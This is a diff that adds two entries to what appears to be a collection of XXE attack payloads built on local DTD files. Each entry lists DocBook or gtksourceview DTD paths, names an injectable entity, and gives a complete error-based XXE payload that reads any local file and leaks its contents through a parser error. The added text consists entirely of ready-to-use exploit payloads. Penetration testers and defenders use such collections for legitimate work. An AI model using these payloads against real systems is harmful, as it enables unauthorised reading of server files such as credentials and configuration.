@@ -911,3 +911,56 @@
 ]>
 <message></message>
 ```
+
+ --- 
+
+**DTD File:** 
+ - `/usr/share/xml/docbook/stylesheet/docbook-xsl/common/l10n.dtd`
+ - `/usr/share/xml/docbook/xsl-stylesheets-1.79.2/common/l10n.dtd`
+ - `/usr/share/xml/docbook/xsl-stylesheets-1.79.2-nons/common/l10n.dtd`
+
+**Injectable entity:** `xmlns`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/docbook/stylesheet/docbook-xsl/common/l10n.dtd">
+
+    <!ENTITY % xmlns '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** 
+ - `/usr/share/gtksourceview-2.0/language-specs/language.dtd`
+ - `/usr/share/gtksourceview-3.0/language-specs/language.dtd`
+ - `/usr/share/gtksourceview-4/language-specs/language.dtd`
+
+
+**Injectable entity:** `commonAttributes`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/gtksourceview-2.0/language-specs/language.dtd">
+
+    <!ENTITY % commonAttributes '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
